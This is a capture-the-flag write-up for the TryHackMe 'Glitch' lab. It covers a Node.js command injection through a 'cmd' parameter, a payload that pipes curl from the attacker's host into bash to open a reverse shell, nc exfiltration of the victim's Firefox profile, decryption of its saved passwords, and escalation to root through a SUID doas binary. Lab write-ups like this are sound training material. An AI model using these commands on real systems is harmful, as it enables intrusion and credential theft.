@@ -1,0 +1,238 @@
+Glitch
+
+LINK:https://tryhackme.com/room/glitch
+
+NMAP RESULTS:
+
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: not allowed
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+CHECKING THE SOURCE CODE, I FOUND SOME JS CODE:
+=========================================================
+  <script>
+      function getAccess() {
+        fetch('/api/access')
+          .then((response) => response.json())
+          .then((response) => {
+            console.log(response);
+          });
+      }
+    </script>
+=========================================================
+
+ IT IS ACTUALLY FETCHING SOME JSON OBJECT FROM THE LOCATION GIVEN AS AN ARGUEMENT IN THE fetch() FUNTION
+
+
+AFTER NAVIGATING THROUGH THE '/api/access', WE GOT A TOKEN VALUE ENCODED IN BASE64:
+
+{"token":"dGhpc19pc19ub3RfcmVhbA=="}
+
+DECODING IT, WE GET THE TOKEN VALUE:
+=====================================================
+┌──(kali㉿kali)-[~]
+└─$ echo -n "dGhpc19pc19ub3RfcmVhbA==" | base64 -d                                                                                1 ⨯
+this_is_not_real                                                                                                                            ========================================================
+
+
+I CHANGE THE TOKEN VALUE OF THE WEBPAGE BY PRESSING F12 AND THEN IN THE STORAGE TAB
+REFRESHING THE PAGE WE GET SOMETHING DIFFERENT
+
+AFTER CHECKING THE SOURCE CODE , I FOUND A JS SCRIPT:
+==============================================================
+(async function () {
+  const container = document.getElementById('items');
+  await fetch('/api/items')
+    .then((response) => response.json())
+    .then((response) => {
+      response.sins.forEach((element) => {
+        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
+        container.insertAdjacentHTML('beforeend', el);
+      });
+      response.errors.forEach((element) => {
+        let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
+        container.insertAdjacentHTML('beforeend', el);
+      });
+      response.deaths.forEach((element) => {
+        let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
+        container.insertAdjacentHTML('beforeend', el);
+      });
+    });
+
+  const buttons = document.querySelectorAll('.btn');
+  const items = document.querySelectorAll('.item');
+  buttons.forEach((button) => {
+    button.addEventListener('click', (event) => {
+      event.preventDefault();
+      const filter = event.target.innerText;
+      items.forEach((item) => {
+        if (filter === 'all') {
+          item.style.display = 'flex';
+        } else {
+          if (item.classList.contains(filter)) {
+            item.style.display = 'flex';
+          } else {
+            item.style.display = 'none';
+          }
+        }
+      });
+    });
+  });
+})();
+==============================================================================
+
+
+THE fetch() funtion is fetching the contents(JSON OBJECT) from the page '/api/items'
+
+NAVIGATING THROUGH IT:
+========================================
+{
+"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],
+"errors":["error","error","error","error","error","error","error","error","error"],
+"deaths":["death"]
+}
+========================================
+
+AFTER THIS STEP I GOT STUCK, THEN I CHECK THE HINT 
+
+USING THE HINT I USE BURPSUITE AND CHECK THE REQUEST METHODS ON THE '/api/items'
+======================
+REQUEST:
+POST /api/items/ HTTP/1.1
+
+RESPONSE:
+{"message":"there_is_a_glitch_in_the_matrix"}
+======================
+
+POST METHOD ALSO WORKS
+POST METHOD MEANS SENDING DATA, SO THERE IS MAYBE A PARAMETER WHICH SENDS DATA TO THE SERVER?
+
+SO I USE WFUZZ, FOR FUZZING THE PARAMETER:
+
+┌──(kali㉿kali)-[~]
+└─$ wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hh 45 -X POST http://10.10.67.112/api/items?FUZZ=anything 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.67.112/api/items?FUZZ=anything
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                
+=====================================================================
+
+000000915:   500        10 L     64 W       1081 Ch     "cmd"                                                   
+
+Total time: 78.20104
+Processed Requests: 4614
+Filtered Requests: 4613
+Requests/sec.: 59.00176
+
+
+GOT 'cmd' AS A PARAMETER
+AS THIS SERVER IS A NODE.JS SERVER SO WE HAVE TO CHECK HOW TO CREATE A REVERSE SHELL IN IT
+
+USING BURPSUIT:
+REQUEST:
+http://<ip>/api/items?cmd=require("child_process").exec("curl 10.8.73.218/shell.sh|bash")
+
+(ADD THE NETCAT REVERSE SHELL IN THE SHELL.SH FILE FIRST)
+
+HOST A PYTHON SERVER AND LISTEN ON NETCAT:
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1234 
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.66.189] 42794
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+STABILIZING THE SHELL BY:
+====================================================
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+CTRL+Z
+stty raw -echo;fg
+(PRESS ENTER TWO TIMES)
+
+
+
+IM IN!!
+GOT THE USER FLAG
+
+in the home directory of the 'user':
+user@ubuntu:~$ ls -la
+total 48
+drwxr-xr-x   8 user user  4096 Jan 27 10:33 .
+drwxr-xr-x   4 root root  4096 Jan 15 14:13 ..
+lrwxrwxrwx   1 root root     9 Jan 21 09:05 .bash_history -> /dev/null
+-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
+drwx------   2 user user  4096 Jan  4 13:41 .cache
+drwxrwxrwx   4 user user  4096 Jan 27 10:32 .firefox
+drwx------   3 user user  4096 Jan  4 13:41 .gnupg
+drwxr-xr-x 270 user user 12288 Jan  4 14:07 .npm
+drwxrwxr-x   5 user user  4096 Apr  3 04:46 .pm2
+drwx------   2 user user  4096 Jan 21 08:47 .ssh
+-rw-rw-r--   1 user user    22 Jan  4 15:29 user.txt
+
+I FOUND A '.firefox' DIRECTORT, so i make a zip file of this directory,then send this to my local machine
+
+ON THE LOCAL MACHINE:
+=========================
+user@ubuntu:~$ nc 10.8.73.218 1234 < firefox.tar.gz 
+user@ubuntu:~$ md5sum firefox.tar.gz 
+ca44f6a4cca2da18fc273b2206406bf8  firefox.tar.gz
+user@ubuntu:~$ 
+
+
+ON THE REMOTE MACHINE:
+==========================
+┌──(kali㉿kali)-[~/glitch]
+└─$ nc -nvlp 1234 > firefox.tar.gz                                                             
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.66.189] 42802
+^C
+┌──(kali㉿kali)-[~/glitch]
+└─$ md5sum firefox.tar.gz 
+ca44f6a4cca2da18fc273b2206406bf8  firefox.tar.gz
+
+
+AS MD5 ARE SAME WHICH MEANS FILE TRANSFERED PROPERLY
+
+
+NOW USING THE FIREFOX EXTRACTER (WHICH I DOWNLOADED FROM GITHUB)
+
+┌──(kali㉿kali)-[~/glitch]
+└─$ sudo python3 /opt/firefox_decrypt/firefox_decrypt.py .firefox                                                                                                   4 ⨯
+Select the Firefox profile you wish to decrypt
+1 -> hknqkrn7.default
+2 -> b5w4643p.default-release
+2
+
+Master Password for profile .firefox/b5w4643p.default-release: 
+2021-04-03 01:56:52,131 - WARNING - Attempting decryption with no Master Password
+
+Website:   https://glitch.thm
+Username: 'v0id'
+Password: 'love_the_void'
+
+GOT THE PASSWORD FOR THE ANOTHER USER 'v0id'
+
+LETS SU TO HIM
+USING THE FIND COMMAND FOR SUID BITS 
+FOUND A WEIRD ONE:
+/usr/local/bin/doas
+
+v0id@ubuntu:~$ /usr/local/bin/doas -u root /bin/bash
+Password: 
+root@ubuntu:/home/v0id#
+(GIVING THE SAME PASSWORD)
+
+GOT THE ROOT FLAG
+
+
